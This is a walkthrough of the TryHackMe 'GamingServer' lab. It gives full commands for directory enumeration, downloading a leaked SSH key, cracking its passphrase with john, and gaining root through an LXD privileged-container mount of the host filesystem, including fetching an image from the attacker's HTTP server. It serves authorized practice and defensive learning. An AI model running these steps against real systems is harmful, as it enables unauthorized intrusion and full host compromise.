🎮 TryHackMe - GamingServer
Room: GamingServer
Platform: TryHackMe
Difficulty: Easy / Beginner - Boot2Root
Time: ~45 min
Category: Web Enumeration - SSH Key Cracking - LXD PrivEsc

TryHackMe
Difficulty
OS
Status

📖 Overview
GamingServer is an Easy Boot2Root box for beginners.

A badly-written gaming server left too much exposed on the web:

Enumeration - Nmap + Gobuster
Leak - Private SSH key in /secret + wordlist in /uploads
Cracking - ssh2john + john to crack the SSH key passphrase
Initial Access - SSH with private key as user john
Privilege Escalation - User is in lxd group -> Privileged container -> Mount host / -> Root
Perfect room to learn: Web Directory Enumeration, SSH Key Cracking, and LXD PrivEsc.

🛠️ Tools Used
Tool	Usage
nmap	Port scanning & Service detection
gobuster	Directory brute-forcing
wget / curl	Download leaked files
ssh2john + john	Crack SSH key passphrase
ssh -i	SSH login with private key
lxc / lxd	LXD Privilege Escalation
Kali Linux	Attack Machine
🔍 Walkthrough
1. Enumeration - Nmap
nmap -A -T4 -p- -oN nmap_scan <TARGET_IP>
Open Ports Found:

22/tcp - SSH - OpenSSH 7.6p1
80/tcp - HTTP - Apache httpd 2.4.29 - Ubuntu 18.04.4 LTS
2. Web Enumeration - Gobuster
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
Found:

/uploads (Status: 301)
/secret (Status: 301)
Check the homepage source too - there is a comment with a username hint.

3. Leak - /uploads + /secret
In /uploads:

wget http://<TARGET_IP>/uploads/dict.lst
wget http://<TARGET_IP>/uploads/manifesto.txt
wget http://<TARGET_IP>/uploads/meme.jpg
dict.lst - Custom wordlist, we will need it later
manifesto.txt / meme.jpg - Distraction
In /secret:

wget http://<TARGET_IP>/secret/secretKey
cat secretKey
You will see:

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
This is an encrypted SSH private key - it needs a passphrase.

4. Crack SSH Key Passphrase - John
chmod 400 secretKey
python3 /usr/share/john/ssh2john.py secretKey > secret.hash
john --wordlist=dict.lst secret.hash
john --show secret.hash
John cracks the passphrase using the dict.lst we found in /uploads.

Tip: Don't use rockyou.txt here, the passphrase is in the custom dict.lst from the server itself.

5. SSH Access - user john
Username hint is in the homepage HTML comment / source: john

ssh -i secretKey john@<TARGET_IP>
# Enter passphrase when asked (the one John cracked)
whoami
# john
Get user flag:

ls -la
cat user.txt
6. Privilege Escalation - LXD Group
Check groups:

id
groups
Output:

uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
lxd group = Root!
Members of lxd can create a privileged container and mount the host filesystem.

Step A - Build Alpine image on Attacker machine:
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
ls -la *.tar.gz
python3 -m http.server 8000
Step B - Download it on Target:
cd /tmp
wget http://<YOUR_TUN_IP>:8000/alpine-v3.13-x86_64-*.tar.gz
Step C - Import & Exploit LXD on Target:
lxc image import ./alpine-v3.13-x86_64-*.tar.gz --alias myimage
lxc image list
lxd init # Accept defaults

lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
Verify:

id
# uid=0(root) gid=0(root)
Step D - Root Flag (from inside container):
Host filesystem is mounted at /mnt/root:

cd /mnt/root/root/
ls -la
cat root.txt
🚩 Flags
Flag	Location
user.txt	/home/john/user.txt
root.txt	/root/root.txt (via /mnt/root/root/root.txt in container)
⚠️ Flags are redacted from this repo. Replace with your own flags after completing the room.

🐛 Common Errors & Fixes
Error	Cause	Fix
Permissions 0644 for 'secretKey' are too open	SSH key permissions	chmod 400 secretKey
Enter passphrase keeps failing	Wrong wordlist	Use dict.lst from /uploads, not rockyou
lxc: command not found / lxd init fails	LXD not initialized	Run lxd init and accept defaults
Failed to connect to local LXD	User not in lxd group / session	Re-login via SSH, check id
No such file for image	Wrong filename	ls *.tar.gz and copy exact name
🧠 Key Learnings
Never expose /secret or /uploads - Directory listing leaks private keys + wordlists.
Never leave private SSH keys on a web server - Especially encrypted ones with weak passphrases.
Custom wordlists matter - The passphrase was in dict.lst found on the target itself.
Check id / groups first - lxd group = instant root via container mount. Check GTFOBins / HackTricks - LXD.
Container escape ≠ Container break - Mounting host / into a privileged container = full host compromise.
🔗 References
Room: https://tryhackme.com/room/gamingserver
LXD PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/lxd-privilege-escalation
LXD Alpine Builder: https://github.com/saghul/lxd-alpine-builder
👨‍💻 Author
Ahmed Ashraf

TryHackMe Labs & CTF Writeups
Focus: Penetration Testing / Web Enumeration / Linux PrivEsc
This writeup is for educational purposes only in an authorized lab environment. Do not use these techniques on systems you don't own or don't have permission to test.

